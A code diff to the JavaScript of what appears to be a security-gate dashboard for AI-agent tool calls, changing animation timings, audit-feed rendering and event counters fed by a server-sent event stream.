     const interval = setInterval(() => {
       if (step <= stopIndex) {
         const nodeEl = document.getElementById(nodes[step]);
-        if (step === stopIndex && s.blockedNode) {
-          nodeEl.className = s.verdict === 'review' ? 'pipe-node review' : 'pipe-node blocked';
+        if (step === stopIndex && blockedNode) {
+          nodeEl.className = verdict === 'REVIEW' ? 'pipe-node review' : 'pipe-node blocked';
         } else {
           nodeEl.className = 'pipe-node active';
         }
@@ -1330,14 +1082,14 @@
         setTimeout(() => {
           nodes.forEach(n => document.getElementById(n).className = 'pipe-node');
           arrows.forEach(a => document.getElementById(a).className = 'flow-arrow');
-        }, 1800);
+        }, 1400);
       }
-    }, 130);
+    }, 100);
   }
 
   function addFeedEntry(e) {
     allAuditEntries.unshift(e);
-    if (allAuditEntries.length > 100) allAuditEntries.pop();
+    if (allAuditEntries.length > 80) allAuditEntries.pop();
     renderFeed();
   }
 
@@ -1349,14 +1101,21 @@
       const row = document.createElement('div');
       row.className = 'feed-row';
       const timeStr = new Date(e.ts).toLocaleTimeString();
-      const argsStr = e.args ? JSON.stringify(e.args) : (e.decision || '');
+      let argsStr = '';
+      if (typeof e.args === 'string') {
+        argsStr = e.args;
+      } else if (e.args) {
+        argsStr = JSON.stringify(e.args);
+      } else if (e.decision) {
+        argsStr = e.decision;
+      }
       row.innerHTML = `
-        <div class="feed-left">
+        <div style="display:flex; align-items:center; gap:6px; overflow:hidden;">
           <span class="feed-tag ${e.kind}">${e.kind}</span>
-          <span class="feed-tool">${escapeHTML(e.tool || 'system')}</span>
+          <span class="feed-tool">${escapeHTML(e.tool || 'gate')}</span>
           <span class="feed-args">${escapeHTML(argsStr)}</span>
         </div>
-        <div class="feed-right">
+        <div style="font-family:var(--font-mono); font-size:9.5px; color:var(--text-dim); white-space:nowrap;">
           <span>${timeStr}</span>
         </div>
       `;
@@ -1379,7 +1138,7 @@
     })[m]);
   }
 
-  // Connect SSE Stream for real agent traffic if connected
+  // Connect SSE Stream for real-time telemetry
   function connectSSE() {
     const src = new EventSource('/events');
     const connEl = document.getElementById('conn-state');
@@ -1390,7 +1149,7 @@
     };
 
     src.onerror = () => {
-      connEl.textContent = 'STANDBY (ON DEMAND)';
+      connEl.textContent = 'STANDBY';
       connEl.parentElement.style.color = '#38bdf8';
     };
 
@@ -1415,16 +1174,24 @@
         const item = JSON.parse(ev.data);
         if (item.data) {
           addFeedEntry(item.data);
-          incCount('cnt-total');
-          if (item.data.kind === 'blocked') incCount('cnt-blocked');
-          else if (item.data.kind === 'response') incCount('cnt-allowed');
-          else if (item.data.kind === 'redacted') incCount('cnt-redacted');
+          const total = document.getElementById('cnt-total');
+          total.textContent = (parseInt(total.textContent) || 0) + 1;
+          if (item.data.kind === 'blocked') {
+            const el = document.getElementById('cnt-blocked');
+            el.textContent = (parseInt(el.textContent) || 0) + 1;
+          } else if (item.data.kind === 'response') {
+            const el = document.getElementById('cnt-allowed');
+            el.textContent = (parseInt(el.textContent) || 0) + 1;
+          } else if (item.data.kind === 'redacted') {
+            const el = document.getElementById('cnt-redacted');
+            el.textContent = (parseInt(el.textContent) || 0) + 1;
+          }
         }
       } catch (err) {}
     });
   }
 
-  // Initialize view
+  // Initial load
   onSelectScenario();
   connectSSE();
 </script>
